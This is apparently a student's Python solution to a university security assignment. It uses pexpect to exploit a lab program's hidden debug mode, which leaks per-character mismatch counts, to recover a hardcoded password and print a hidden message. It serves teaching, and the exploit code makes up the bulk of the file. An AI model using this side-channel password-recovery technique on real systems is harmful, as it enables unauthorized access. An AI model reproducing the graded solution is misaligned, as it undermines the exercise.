
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 2b solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code, `task2b-vuln.c`, and found a debug statement that
    outputs sensative information about the hardcoded password when the environment variable " D E B U G = 1"
* The debug only outputs when the entered password's length matches that of the hardcoded password.
* The debug outputs the number of incorrect characters of the input password compared to the hardcoded password 
    and tells me if a character at a position, by extraoplating from what I entered and the output, is correct.

### how the script works
* I first set the environment variable " D E B U G = 1"
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`
* I have a loop that finds the length of the hardcoded password by repeatedly starting the vulnerable program 
    and inputting passwords from length 2-30 until we get the debug output.
* Once the password length is found, I generate passwords of that length using one unique character (that are valid
    for passwords, as described in the assignment spec.), ex. length = 3, passwords: 'aaa', ..., 'zzz', 'AAA', ..., 'ZZZ', '000', ..., '999'.
* I then run the vulnerable program over and over on those generated passwords to slowly find the characters 
    of the hardcoded password.
* Once the hardcoded password has been retrieved by using the above process, I set the environment variable " D E B U G = 0" 
    and start the vulnerable program again, and this time entering the hardcoded password I found, 
    and retrieving the hidden message.
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"

MAX_PASSWORD_LENGTH = 30
ARBITRARY_CHAR = 'a'

class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()

def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p

def set_environ_var(val: bool):
    '''
    sets the ` D E B U G ` environment variable to "1" (val = True) or "0" (val = False).
    '''
    if (val):
        os.environ[" D E B U G "] = "1"
    else:
        os.environ[" D E B U G "] = "0"

def main(execname):
    """exploit the vulnerable executable using pexpect"""
    
    password_len_found = False
    arbitrary_password = ARBITRARY_CHAR * 2
    # debug_data = ""
    process = None
    
    try:
        # find the password length
        while (not password_len_found and len(arbitrary_password) <= MAX_PASSWORD_LENGTH):
            
            # print("curr pass len:",len(arbitrary_password), "<"+arbitrary_password+">") # debug
            
            # try:
            #     # set ` D E B U G ` environment variable to "1"
            #     os.environ[" D E B U G "] = "1"
            # except Exception:
            #     print("eokfnweuiofweobfeoiwn")
            set_environ_var(True)  # set the environment variable to True
            
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)

            # try:
                # process.expect_exact("Debug mode active.")
            # except Exception:
                # print('oiehfeohfe')

            process.expect_exact("Debug mode active.\n")
            # print("sup")# debug
            # wait for the password prompt
            process.expect_exact("Password:")
            process.sendline(arbitrary_password)
            
            # read the remaining output of the program one line at a time until <EOF>
            process.expect(pexpect.EOF, timeout=8)
            reply = process.before.decode("ascii")
            # print(f'---reply: \n"\n{reply}"')    # debug
            
            EXPECTED_MESSAGE = "Wrong password.\n"
            
            # check if `reply` is only `EXPECTED_MESSAGE`, otherwise we obtained debug data
            if (reply != EXPECTED_MESSAGE):
                # print(f"---password len found! <{len(arbitrary_password)}>") # debug
                password_len_found = True
                
                # filter out the `EXPECTED_MESSAGE` line
                # print(reply)                  # debug
                # print(reply.rsplit(' '))      # debug
                # debug_data = reply.rsplit(' ')[0:len(debug_data)-2]    # set the debug_data with debug table data (remove the last 2 elements after `rsplit()``)
                # print(debug_data)   # debug
                process.kill(True)
                break
            
            # increment arbitrary password length by 1
            arbitrary_password += ARBITRARY_CHAR 

        # find the hardcoded password itself
        if (password_len_found):
            password_len = len(arbitrary_password)
            num_char_to_find = password_len
            
            # print(f"password len: {password_len}")  # debug            

            #debug            
            # print(ord('a'))
            # print(ord('z'))
            
            # stores the passwords I will be trying
            passwords_to_try_array = []     # 2D array
            tmp_array = []                  # store passwords temporarily

            # generate passwords of length `password_len` using one unique character from the
            # set of valid characters defined in the assignment spec
            
            # lowercase letters
            for ascii_val in range(ord('a'), ord('z') + 1):     
                # print(f"ascii<{ascii_val}> char<{chr(ascii_val)}>\n", end="")   # debug
                tmp_array.append(chr(ascii_val) * password_len)
            passwords_to_try_array.append(tmp_array)
            
            # uppercase letters
            for ascii_val in range(ord('A'), ord('Z') + 1):     
                # print(f"ascii<{ascii_val}> char<{chr(ascii_val)}>\n", end="")   # debug
                tmp_array.append(chr(ascii_val) * password_len)
            passwords_to_try_array.append(tmp_array)
            
            # numerical
            for ascii_val in range(ord('0'), ord('9') + 1):     
                # print(f"ascii<{ascii_val}> char<{chr(ascii_val)}>\n", end="")   # debug
                tmp_array.append(chr(ascii_val) * password_len)
            passwords_to_try_array.append(tmp_array)
            
            # print(passwords_to_try_array)    #debug
            
            hardcoded_pass_arr = [""] * password_len  # we will build the hardcoded password using an array of characters
            # print(f"pass built: {hardcoded_pass_arr}") # debug
            
            # find the password, character by character, by running the vulnerable process over and over on `passwords_to_try_array[index]` elements 
            for index in range(0, len(passwords_to_try_array)): # go though each array

                if (num_char_to_find == 0): # case to stop
                    break
                
                for x in range(0, len(passwords_to_try_array[index])):  # go though elements in `passwords_to_try_array[index]`
                    
                    if (num_char_to_find == 0): # case to stop
                        break
                    
                    # print() # debug new line
                    
                    # start the vulnerable program
                    # since popen() is not using pty, we need to use stdbuf(1)
                    # to disable output buffering
                    process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
                    process.expect_exact("Password:")
                    
                    password_to_try = passwords_to_try_array[index][x]  # password to try
                    process.sendline(password_to_try)

                    # print(f"trying pass: <{password_to_try}>") # debug
                    
                    # read the remaining output of the program one line at a time until <EOF>
                    process.expect(pexpect.EOF, timeout=8)
                    reply = process.before.decode("ascii")
                    
                    # parse the `reply`
                    # print(f'---reply: \n"\n{reply}"')    # debug
                    debug_data = reply.rsplit(' ')
                    debug_data = debug_data[0:len(debug_data)-2]    # set the debug_data with debug table data (remove the last 2 elements after `rsplit()``)
                    # print(f'---skimmed reply: \n"{debug_data}"')    # debug

                    # check the last element of the `debug_data` array to see if we found character(s) of the hardcoded password (ie last element != `password_len`)
                    if (int(debug_data[len(debug_data) - 1]) != password_len):
                        # print("---found letter(s) of hardcoded password!")  # debug
                        
                        # go though `debug_data` values then compare `password_to_try` to find character(s) of hardcoded password
                        prev_val = debug_data[0]    # save first value
                        if (int(prev_val) == 0):    # check if the first char of `password_to_try` is part of the hardcoded password
                            hardcoded_pass_arr[0] = password_to_try[0]    # update the `password_arr`
                            num_char_to_find -= 1
                            
                            # debug
                            # print(f"\tinx[{0}] = {password_to_try[0]} | chars left to find: {num_char_to_find}")    
                            # print(f"\tupdated hardcoded pass: {hardcoded_pass_arr}")
                         
                        # go though the debug_data to find characters of hardcoded password
                        for c in range(1, len(debug_data)):
                            
                            # check if we found a character of the hardcoded password
                            if (debug_data[c] == prev_val):
                                hardcoded_pass_arr[c] = password_to_try[c]    # update the `password_arr` at the index
                                num_char_to_find -= 1 # decrement since we found a character of the hardcoded password
                                
                                # debug
                                # print(f"\tinx[{c}] = {password_to_try[c]} | chars left to find: {num_char_to_find}")    
                                # print(f"\tupdated hardcoded pass: {hardcoded_pass_arr}")
                            
                            prev_val = debug_data[c]    # update
            
            # print(f"---hardcoded password (arr form): {hardcoded_pass_arr}") # debug
            
            # build the hardcoded password
            hardcoded_password = ""
            for x in range(0, len(hardcoded_pass_arr)):
                hardcoded_password += hardcoded_pass_arr[x]
            
            # print(f"---hardcoded password: {hardcoded_password}") # debug
            
            # get the hidden message
            set_environ_var(False)  # set the environment variable to false
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
            # wait for the password prompt
            process.expect_exact("Password:")
            process.sendline(hardcoded_password)
            
            process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
            process.expect_exact("-----END HIDDEN MESSAGE-----")
            hidden_message = process.before.decode("ascii").rstrip()
            # optional: read the remaining output of the program one line at a time until <EOF>
            process.expect(pexpect.EOF, timeout=8)      
            
            # print out the recovered hidden message  
            print("Recovered hidden message:", hidden_message)
            

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
